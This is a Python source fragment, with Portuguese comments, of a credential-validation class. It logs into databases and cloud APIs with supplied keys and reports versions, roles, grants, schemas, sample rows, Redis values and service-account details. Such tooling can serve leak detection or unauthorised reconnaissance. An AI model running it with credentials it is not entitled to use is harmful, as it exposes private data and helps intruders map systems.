                        users.append(f"{u.get('user','?')}@{db_name}[{','.join(u.get('roles', [{}])[0:2])}]")
            except Exception:
                pass
            
            dbs = client.list_database_names()
            db_details = []
            total_docs = 0
            total_cols = 0
            total_size = 0
            
            for db_name in dbs[:10]:
                if db_name in ('admin', 'local', 'config'):
                    continue
                try:
                    db = client[db_name]
                    cols = db.list_collection_names()
                    total_cols += len(cols)
                    col_details = []
                    db_docs = 0
                    db_size = 0
                    
                    # Tamanho do DB
                    try:
                        db_stat = db.command('dbstat')
                        db_size = db_stat.get('dataSize', 0)
                        total_size += db_size
                    except Exception:
                        pass
                    
                    for col_name in cols[:6]:
                        try:
                            count = db[col_name].count_documents({})
                            db_docs += count
                            total_docs += count
                            
                            # Schema do documento (primeiro doc)
                            schema = ""
                            if count > 0:
                                try:
                                    sample = db[col_name].find_one()
                                    if sample:
                                        fields = list(sample.keys())
                                        schema = f" fields:{','.join(fields[:8])}"
                                except Exception:
                                    pass
                            
                            # Índices
                            idx_count = 0
                            try:
                                idx_count = len(db[col_name].index_information())
                            except Exception:
                                pass
                            
                            col_details.append(f"{col_name}({count}d{schema}{f',{idx_count}idx' if idx_count else ''})")
                        except Exception:
                            col_details.append(col_name)
                    
                    size_str = f"{db_size/1024:.0f}KB" if db_size < 1024*1024 else f"{db_size/1024/1024:.1f}MB"
                    db_details.append(f"{db_name}[{len(cols)}c,{db_docs}d,{size_str}]: {'; '.join(col_details[:4])}")
                except Exception:
                    pass
            
            client.close()
            
            if dbs:
                total_size_str = f"{total_size/1024/1024:.1f}MB" if total_size >= 1024*1024 else f"{total_size/1024:.0f}KB"
                msg = f"✅ MongoDB v{version} | cluster: {cluster_name}{' (PRIMARY)' if is_primary else ''} | {len(dbs)} DBs, {total_cols} cols, {total_docs} docs, {total_size_str}"
                if db_details:
                    msg += f" | {' | '.join(db_details[:3])}"
                if users:
                    msg += f" | users: {', '.join(users[:3])}"
                return {"is_valid": True, "message": msg[:800], "score": 10}
            return {"is_valid": True, "message": f"✅ MongoDB v{version} ({cluster_name}) — conectou, DB vazia", "score": 9}
        except Exception as e:
            return self._db_error(e)

    async def _validate_postgres(self, key: str) -> dict:
        return await asyncio.to_thread(self._postgres_sync, key)

    def _postgres_sync(self, key: str) -> dict:
        """PostgreSQL — MAX detail: tabelas, colunas, schema, sample row, índices, size, roles, constraints."""
        try:
            if self._psycopg2 is None:
                import psycopg2 as _pg
                self._psycopg2 = _pg
            conn = self._psycopg2.connect(key, connect_timeout=8)
            cur = conn.cursor()
            
            # Versão
            cur.execute("SELECT version()")
            version = cur.fetchone()[0].split(",")[0]
            
            # User e DB
            cur.execute("SELECT current_user, current_database()")
            user, db = cur.fetchone()
            
            # Tamanho do DB
            try:
                cur.execute("SELECT pg_size_pretty(pg_database_size(current_database()))")
                db_size = cur.fetchone()[0]
            except Exception:
                db_size = '?'
            
            # Conexões ativas
            try:
                cur.execute("SELECT count(*) FROM pg_stat_activity WHERE state = 'active'")
                active_conns = cur.fetchone()[0]
            except Exception:
                active_conns = '?'
            
            # Tabelas com colunas e tipos
            cur.execute("""
                SELECT t.table_schema, t.table_name, 
                       string_agg(c.column_name || ':' || c.data_type, ', ' ORDER BY c.ordinal_position)
                FROM information_schema.tables t
                JOIN information_schema.columns c ON t.table_schema = c.table_schema AND t.table_name = c.table_name
                WHERE t.table_schema NOT IN ('pg_catalog','information_schema')
                GROUP BY t.table_schema, t.table_name
                LIMIT 8
            """)
            tables = cur.fetchall()
            n_tables = len(tables)
            
            # Schema detalhado + sample row
            table_details = []
            for schema, table, cols in tables[:6]:
                try:
                    # Conta linhas
                    cur.execute(f'SELECT count(*) FROM "{schema}"."{table}"')
                    cnt = cur.fetchone()[0]
                    
                    # Sample row (primeiro registro)
                    sample = ""
                    if cnt > 0:
                        cur.execute(f'SELECT * FROM "{schema}"."{table}" LIMIT 1')
                        row = cur.fetchone()
                        col_names = [d[0] for d in cur.description]
                        sample_pairs = [f"{cn}={str(rv)[:30]}" for cn, rv in zip(col_names, row) if rv is not None][:5]
                        sample = f" sample:{{{', '.join(sample_pairs)}}}"
                    
                    # Índices
                    cur.execute("""
                        SELECT count(*) FROM pg_indexes WHERE schemaname=%s AND tablename=%s
                    """, (schema, table))
                    n_idx = cur.fetchone()[0]
                    
                    # Primary key
                    cur.execute("""
                        SELECT kcu.column_name FROM information_schema.table_constraints tc
                        JOIN information_schema.key_column_usage kcu ON tc.constraint_name = kcu.constraint_name
                        WHERE tc.constraint_type = 'PRIMARY KEY' AND tc.table_schema=%s AND tc.table_name=%s
                    """, (schema, table))
                    pk = [r[0] for r in cur.fetchall()]
                    
                    table_details.append(f"{table}({cnt}r, {n_idx}idx{f', PK:{pk[0]}' if pk else ''}) cols:{cols[:120]}{sample[:120]}")
                except Exception:
                    table_details.append(f"{table} cols:{cols[:100]}")
            
            # Roles/permissões do user
            try:
                cur.execute("SELECT rolname, rolsuper, rolcreatedb, rolcreaterole FROM pg_roles WHERE rolname = current_user")
                role_row = cur.fetchone()
                if role_row:
                    perms = []
                    if role_row[1]: perms.append("SUPERUSER")
                    if role_row[2]: perms.append("CREATEDB")
                    if role_row[3]: perms.append("CREATEROLE")
                    role_info = f"{role_row[0]}[{','.join(perms) if perms else 'normal'}]"
                else:
                    role_info = user
            except Exception:
                role_info = user
            
            # Extensões
            try:
                cur.execute("SELECT extname FROM pg_extension LIMIT 10")
                exts = [r[0] for r in cur.fetchall()]
            except Exception:
                exts = []
            
            conn.close()
            
            msg = f"✅ {version} | role: {role_info} | db: {db} ({db_size}) | conns: {active_conns} | {n_tables} tabelas"
            if table_details: msg += f" | {' | '.join(table_details[:3])}"
            if exts: msg += f" | exts: {', '.join(exts)}"
            return {"is_valid": True, "message": msg[:800], "score": 10}
        except ImportError:
            return {"is_valid": None, "message": "psycopg2 não instalado", "score": 5}
        except Exception as e:
            return self._db_error(e)

    async def _validate_mysql(self, key: str) -> dict:
        return await asyncio.to_thread(self._mysql_sync, key)

    def _mysql_sync(self, key: str) -> dict:
        """MySQL — MAX detail: tabelas, colunas, engine, sample row, grants, size, connections."""
        try:
            if self._pymysql is None:
                import pymysql as _my
                self._pymysql = _my
            from urllib.parse import urlparse
            u = urlparse(key.replace("mysql://", "mysql://"))
            conn = self._pymysql.connect(
                host=u.hostname, port=u.port or 3306, user=u.username,
                password=u.password, database=(u.path or "/")[1:] if u.path else None,
                connect_timeout=8
            )
            cur = conn.cursor()
            
            # Versão
            cur.execute("SELECT version()")
            version = cur.fetchone()[0]
            
            # User e DB
            cur.execute("SELECT current_user(), database()")
            user, db = cur.fetchone()
            
            # Conexões ativas
            try:
                cur.execute("SHOW STATUS WHERE Variable_name = 'Threads_connected'")
                active_conns = cur.fetchone()[1]
            except Exception:
                active_conns = '?'
            
            # Tamanho do DB
            try:
                cur.execute("SELECT CONCAT(ROUND(SUM(data_length+index_length)/1024/1024,2),'MB') FROM information_schema.tables WHERE table_schema = database()")
                db_size = cur.fetchone()[0]
            except Exception:
                db_size = '?'
            
            # Tabelas com engine e collation
            cur.execute("""
                SELECT table_schema, table_name, engine, table_collation, table_rows
                FROM information_schema.tables
                WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys')
                LIMIT 10
            """)
            tables_raw = cur.fetchall()
            n_tables = len(tables_raw)
            
            # Detalhes por tabela
            table_details = []
            for schema, table, engine, collation, nrows in tables_raw[:6]:
                try:
                    # Colunas e tipos
                    cur.execute("""
                        SELECT column_name, data_type, column_key, extra
                        FROM information_schema.columns
                        WHERE table_schema=%s AND table_name=%s
                        ORDER BY ordinal_position LIMIT 12
                    """, (schema, table))
                    cols = cur.fetchall()
                    col_str = ','.join(f"{c[0]}:{c[1]}{'(PK)' if c[2]=='PRI' else ''}" for c in cols[:10])
                    
                    # Sample row
                    sample = ""
                    try:
                        cur.execute(f"SELECT * FROM `{schema}`.`{table}` LIMIT 1")
                        row = cur.fetchone()
                        if row:
                            col_names = [d[0] for d in cur.description]
                            sample_pairs = [f"{cn}={str(rv)[:30]}" for cn, rv in zip(col_names, row) if rv is not None][:5]
                            sample = f" sample:{{{', '.join(sample_pairs)}}}"
                    except Exception:
                        pass
                    
                    engine_str = f", {engine}" if engine else ""
                    table_details.append(f"{table}[{nrows or '?'}r{engine_str}] cols:{col_str}{sample[:120]}")
                except Exception:
                    table_details.append(f"{table}[{nrows or '?'}r]")
            
            # Grants completos
            grants = []
            try:
                cur.execute("SHOW GRANTS FOR CURRENT_USER()")
                for g in cur.fetchall()[:6]:
                    grants.append(g[0])
            except Exception:
                pass
            
            conn.close()
            
            msg = f"✅ MySQL {version} | user: {user} | db: {db} ({db_size}) | conns: {active_conns} | {n_tables} tabelas"
            if table_details: msg += f" | {' | '.join(table_details[:3])}"
            if grants: msg += f" | grants: {'; '.join(g[:80] for g in grants[:3])}"
            return {"is_valid": True, "message": msg[:800], "score": 10}
        except ImportError:
            return {"is_valid": None, "message": "pymysql não instalado", "score": 5}
        except Exception as e:
            return self._db_error(e)

    async def _validate_redis(self, key: str) -> dict:
        return await asyncio.to_thread(self._redis_sync, key)

    def _redis_sync(self, key: str) -> dict:
        """Redis — MAX detail: version, mode, role, replication, memory, keys by type, persistence, clients, sample keys with types."""
        try:
            if self._redis is None:
                import redis as _rd
                self._redis = _rd
            r = self._redis.Redis.from_url(key, socket_connect_timeout=8)
            r.ping()
            info = r.info()
            n_keys = r.dbsize()
            
            version = info.get('redis_version', '?')
            mode = info.get('redis_mode', '?')  # standalone, cluster, sentinel
            os_info = info.get('os', '?')
            arch = info.get('arch_bits', '?')
            uptime = info.get('uptime_in_seconds', 0)
            uptime_str = f"{uptime//86400}d{uptime%86400//3600}h" if uptime > 3600 else f"{uptime//60}m"
            
            # Memória detalhada
            used_mem = info.get('used_memory_human', '?')
            peak_mem = info.get('used_memory_peak_human', '?')
            mem_frag = info.get('mem_fragmentation_ratio', '?')
            max_mem = info.get('maxmemory_human', 'no limit')
            
            # DBs
            n_dbs = info.get('dbcount', 1)
            
            # Role e replication
            try:
                role_info = r.role()  # ('master'/'slave', ...)
                role = role_info[0] if role_info else '?'
                repl_detail = ""
                if role == 'master' and len(role_info) > 2:
                    slaves = role_info[2]
                    if slaves:
                        repl_detail = f" | slaves: {len(slaves)} ({','.join(s[0] for s in slaves[:2])})"
                elif role == 'slave' and len(role_info) > 2:
                    master_host = role_info[1]
                    repl_detail = f" | master: {master_host}"
            except Exception:
                role = '?'
                repl_detail = ""
            
            # Persistence
            persistence = ""
            try:
                if info.get('rdb_last_bgsave_status', 'ok') == 'ok':
                    persistence += "RDB✅"
                else:
                    persistence += "RDB❌"
                aof = info.get('aof_enabled', 0)
                persistence += f",AOF{'✅' if aof else '❌'}"
            except Exception:
                pass
            
            # Clientes
            clients = info.get('connected_clients', '?')
            blocked_clients = info.get('blocked_clients', 0)
            
            # Keys por tipo (sample)
            type_counts = {"string": 0, "list": 0, "hash": 0, "set": 0, "zset": 0}
            sample_keys = []
            try:
                keys = list(r.scan_iter(count=50))[:20]
                for k in keys[:20]:
                    k_str = k.decode('utf-8', errors='ignore') if isinstance(k, bytes) else str(k)
                    try:
                        ktype = r.type(k)
                        ktype_str = ktype.decode() if isinstance(ktype, bytes) else ktype
                        type_counts[ktype_str] = type_counts.get(ktype_str, 0) + 1
                        # Para hash, pega 1 field
                        if ktype_str == 'hash' and len(sample_keys) < 5:
                            fields = r.hkeys(k, 0, 5)
                            field_names = [f.decode('utf-8', errors='ignore') if isinstance(f, bytes) else str(f) for f in fields[:3]]
                            sample_keys.append(f"{k_str}(hash:{','.join(field_names)})")
                        elif ktype_str == 'string' and len(sample_keys) < 5:
                            val = r.get(k)
                            val_str = (val.decode('utf-8', errors='ignore') if isinstance(val, bytes) else str(val))[:40]
                            sample_keys.append(f"{k_str}={val_str}")
                        elif len(sample_keys) < 5:
                            sample_keys.append(f"{k_str}({ktype_str})")
                    except Exception:
                        sample_keys.append(k_str)
            except Exception:
                pass
            
            type_summary = ','.join(f"{t}:{c}" for t, c in type_counts.items() if c > 0)
            
            msg = f"✅ Redis v{version} | mode: {mode} | role: {role} | up: {uptime_str}"
            msg += f" | {n_keys} keys | mem: {used_mem}/{max_mem} (frag:{mem_frag}) | clients: {clients}"
            if persistence: msg += f" | persist: {persistence}"
            if type_summary: msg += f" | types: {type_summary}"
            if repl_detail: msg += repl_detail
            if sample_keys: msg += f" | sample: {'; '.join(sample_keys[:4])}"
            return {"is_valid": True, "message": msg[:800], "score": 10}
        except ImportError:
            return {"is_valid": None, "message": "redis não instalado", "score": 5}
        except Exception as e:
            return self._db_error(e)

    def _db_error(self, e: Exception) -> dict:
        msg = str(e).lower()
        if any(x in msg for x in ["authentication", "auth failed", "access denied", "password", "noauth", "wrong number"]):
            return {"is_valid": False, "message": f"❌ Auth falhou: {str(e)[:150]}", "score": 9}
        if any(x in msg for x in ["timeout", "refused", "connect", "unreachable", "resolve"]):
            return {"is_valid": None, "message": f"Timeout/sem conexão: {str(e)[:100]}", "score": 5}
        return {"is_valid": None, "message": f"Erro: {str(e)[:150]}", "score": 3}

    async def _validate_none(self, key: str) -> dict:
        return {"is_valid": None, "message": "Sem validação remota disponível", "score": 0}

    async def _validate_whatsapp(self, key: str) -> dict:
        """WhatsApp Cloud API — extrai phone_number_id, business account, waba_id."""
        try:
            # Primeiro pega info do número
            r = await self.client.get(
                f"https://graph.facebook.com/v18.0/me?access_token={key}",
                timeout=10)
            if r.status_code == 200:
                d = r.json()
                name = d.get('name', '?')
                phone_id = d.get('id', '?')
                category = d.get('category', '—')
                
                # Tenta pegar phone numbers
                phone_numbers = []
                try:
                    rp = await self.client.get(
                        f"https://graph.facebook.com/v18.0/{phone_id}/phone_numbers?access_token={key}",
                        timeout=8)
                    if rp.status_code == 200:
                        nums = rp.json().get('data', [])
                        phone_numbers = [n.get('display_phone_number', '?') for n in nums[:3]]
                except Exception:
                    pass
                
                msg = f"✅ WhatsApp Business: {name} (id: {phone_id})"
                if category != '—': msg += f" | categoria: {category}"
                if phone_numbers: msg += f" | números: {', '.join(phone_numbers)}"
                return {"is_valid": True, "message": msg[:500], "score": 10}
            elif r.status_code in (400, 401):
                return {"is_valid": False, "message": "❌ Token inválido ou expirado", "score": 8}
            return {"is_valid": None, "message": f"HTTP {r.status_code}", "score": 5}
        except Exception as e:
            return {"is_valid": None, "message": f"Erro: {str(e)[:100]}", "score": 0}

    async def _validate_firebase(self, key: str) -> dict:
        """Firebase — MAX detail: project_id, databaseURL, storageBucket, service account, private key."""
        try:
            if key.startswith("http"):
                r = await self.client.get(key, timeout=10)
                if r.status_code == 200:
                    try:
                        d = r.json()
                        proj = d.get('project_id', '')
                        proj_id = d.get('projectId', '')
                        db_url = d.get('databaseURL', d.get('database_url', ''))
                        storage = d.get('storageBucket', d.get('storage_bucket', ''))
                        api_key = d.get('apiKey', '')
                        app_id = d.get('appId', '')
                        sender_id = d.get('messagingSenderId', '')
                        auth_domain = d.get('authDomain', '')
                        measurement = d.get('measurementId', '')
                        
                        msg = "✅ Firebase config acessível"
                        if proj or proj_id: msg += f" | project: {proj or proj_id}"
                        if db_url: msg += f" | db: {db_url[:60]}"
                        if storage: msg += f" | storage: {storage}"
                        if auth_domain: msg += f" | auth: {auth_domain}"
                        if api_key: msg += f" | apiKey: {api_key[:20]}..."
                        if sender_id: msg += f" | sender: {sender_id}"
                        if app_id: msg += f" | appId: {app_id[:20]}..."
                        if measurement: msg += f" | GA: {measurement}"
                        return {"is_valid": True, "message": msg[:800], "score": 9}
                    except Exception:
                        return {"is_valid": True, "message": "✅ Firebase config acessível", "score": 8}
                return {"is_valid": False, "message": f"HTTP {r.status_code}", "score": 6}
            if "{" in key and "private_key" in key:
                try:
                    d = json.loads(key)
                    proj = d.get('project_id', '?')
                    client_email = d.get('client_email', '—')
                    tipo = d.get('type', '?')
                    private_key_id = d.get('private_key_id', '')
                    token_uri = d.get('token_uri', '')
                    auth_uri = d.get('auth_uri', '')
                    client_x509 = d.get('client_x509_cert_url', '')
                    
                    msg = f"✅ Service Account | project: {proj} | type: {tipo}"
                    if client_email != '—': msg += f" | email: {client_email}"
                    if private_key_id: msg += f" | keyId: {private_key_id[:20]}..."
                    if token_uri: msg += f" | token: {token_uri.split('/')[-1]}"
                    return {"is_valid": True, "message": msg[:800], "score": 10}
                except Exception:
                    return {"is_valid": True, "message": "✅ Service Account Key (formato JSON válido)", "score": 9}
            return {"is_valid": None, "message": "Formato não reconhecido", "score": 3}
        except Exception as e:
            return {"is_valid": None, "message": f"Erro: {str(e)[:100]}", "score": 0}

    async def _validate_sqlite(self, key: str) -> dict:
        """SQLite — verifica se o arquivo existe e pega info."""
        import os
        if os.path.exists(key):
            try:
                import sqlite3 as _sqlite3
                conn = _sqlite3.connect(key, timeout=3)
                cur = conn.cursor()
                cur.execute("SELECT count(*) FROM sqlite_master WHERE type='table'")
                n_tables = cur.fetchone()[0]
                cur.execute("SELECT name FROM sqlite_master WHERE type='table' LIMIT 10")
                table_names = [r[0] for r in cur.fetchall()]
                size = os.path.getsize(key)
                conn.close()
                msg = f"✅ SQLite | {size} bytes | {n_tables} tabelas"
                if table_names: msg += f" | {', '.join(table_names[:5])}"
                return {"is_valid": True, "message": msg[:400], "score": 8}
            except Exception as e:
                return {"is_valid": True, "message": f"✅ Arquivo existe ({os.path.getsize(key)} bytes)", "score": 7}
        return {"is_valid": None, "message": "Arquivo não encontrado (remoto?)", "score": 3}

    async def _validate_elastic(self, key: str) -> dict:
        """Elasticsearch — MAX detail: version, cluster, nodes, indices, docs count, health."""
        try:
            if key.startswith("http"):
                r = await self.client.get(key, timeout=10)
                if r.status_code == 200:
                    d = r.json()
                    version = d.get('version', {}).get('number', '?')
                    cluster = d.get('cluster_name', '?')
                    name = d.get('name', '?')
                    tagline = d.get('tagline', '')
                    
                    # Cluster health
                    health_info = ""
                    try:
                        rh = await self.client.get(f"{key}/_cluster/health", timeout=8)
                        if rh.status_code == 200:
                            h = rh.json()
                            status = h.get('status', '?')
                            n_nodes = h.get('number_of_nodes', '?')
                            n_data_nodes = h.get('number_of_data_nodes', '?')
                            active_shards = h.get('active_shards', '?')
                            relocating = h.get('relocating_shards', 0)
                            unassigned = h.get('unassigned_shards', 0)
                            health_info = f" | health: {status} | nodes: {n_nodes}({n_data_nodes} data) | shards: {active_shards}"
                            if unassigned: health_info += f" | unassigned: {unassigned}"
                    except Exception:
                        pass
                    
                    # Indices detalhado
                    indices_info = ""
                    try:
                        ri = await self.client.get(f"{key}/_cat/indices?format=json", timeout=8)
                        if ri.status_code == 200:
                            idxs = ri.json()
                            indices_info = f" | {len(idxs)} índices"
                            idx_details = []
                            for i in idxs[:5]:
                                idx_name = i.get('index', '?')
                                docs = i.get('docs.count', '?')
                                size = i.get('store.size', '?')
                                health = i.get('health', '')
                                idx_details.append(f"{idx_name}({docs}d,{size})")
                            if idx_details:
                                indices_info += f": {', '.join(idx_details)}"
                    except Exception:
                        pass
                    
                    # Aliases
                    aliases_info = ""
                    try:
                        ra = await self.client.get(f"{key}/_cat/aliases?format=json", timeout=8)
                        if ra.status_code == 200:
                            aliases = ra.json()
                            if aliases:
                                alias_names = [a.get('alias', '?') for a in aliases[:5]]
                                aliases_info = f" | aliases: {', '.join(alias_names)}"
                    except Exception:
                        pass
                    
                    msg = f"✅ Elasticsearch v{version} | cluster: {cluster} | node: {name}{health_info}{indices_info}{aliases_info}"
                    return {"is_valid": True, "message": msg[:800], "score": 10}
                return {"is_valid": False, "message": f"HTTP {r.status_code}", "score": 6}
            return {"is_valid": None, "message": "Formato não reconhecido (esperado URL http://...)", "score": 3}
        except Exception as e:
            return self._db_error_async(e)

    def _db_error_async(self, e: Exception) -> dict:
        msg = str(e).lower()
        if any(x in msg for x in ["timeout", "refused", "connect", "unreachable", "resolve"]):
            return {"is_valid": None, "message": f"Sem conexão: {str(e)[:100]}", "score": 5}
        return {"is_valid": None, "message": f"Erro: {str(e)[:150]}", "score": 3}

    async def _validate_cert(self, key: str) -> dict:
        """Certificado X.509 — valida formato e tenta extrair info."""
        if "BEGIN CERTIFICATE" in key:
            # Conta quantos certificados tem na chain
            n_certs = key.count("BEGIN CERTIFICATE")
            # Identifica se é CA ou leaf
            is_ca = "CA:TRUE" in key or "CERTIFICATE AUTHORITY" in key.upper()
            msg = f"✅ Certificado X.509 (PEM) | {n_certs} cert(s) na chain"
            if is_ca: msg += " | CA certificate"
            return {"is_valid": True, "message": msg[:300], "score": 7}
        return {"is_valid": None, "message": "Formato não reconhecido", "score": 2}

    async def close(self):
        await self.client.aclose()